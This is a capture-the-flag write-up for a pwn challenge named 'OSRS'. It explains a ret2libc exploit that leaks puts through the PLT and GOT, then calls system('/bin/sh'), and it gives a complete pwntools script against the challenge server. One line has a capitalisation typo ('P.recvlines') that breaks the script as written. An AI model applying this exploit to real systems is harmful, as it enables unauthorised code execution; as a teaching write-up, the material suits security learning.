# OSRS

There is literally zero protections.  

We *could* do ret to shellcode, but there's no jmp esp and the shifts with the buffer can be very temperamental.  
Instead, I used ret2libc, which is a lot more reliable.  

Via the GOT and PLT, we can execute a simple leak of the address of puts.   
Feeding this value into libc database find, their libc version is libc6-i386_2.27-3ubuntu1_amd64  

So, we can use the GOT and PLT to leak the address of puts and call main again.  
Then, we can subtract the appropriate value from this to get the libc base.  
Since we called main again, we get a second input, to which we can deliver the main payload of system("/bin/sh").  

```python
from pwn import *
NUM_TO_RET = 0x10c + 4
padding = b'A' * NUM_TO_RET
e = ELF("./osrs")
leak = flat(padding, e.plt['puts'], e.symbols['main'], e.got['puts'])
libc = ELF("/home/kali/Tools/libc-database/libs/libc6-i386_2.27-3ubuntu1_amd64")
p = remote("p1.tjctf.org", 8006)
p.recvuntil(": ")
p.sendline(leak)
P.recvlines(2)
output = p.recvline() # Our leak of the puts address
puts = u32(output[:4])
log.info(f"Puts address: {hex(puts)}")
libcbase = puts - libc.symbols['puts']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
final = flat(padding, libc.symbols['system'], libc.symbols['exit'], next(libc.search(b"/bin/sh\x00")))
p.sendline(final)
p.interactive()
```
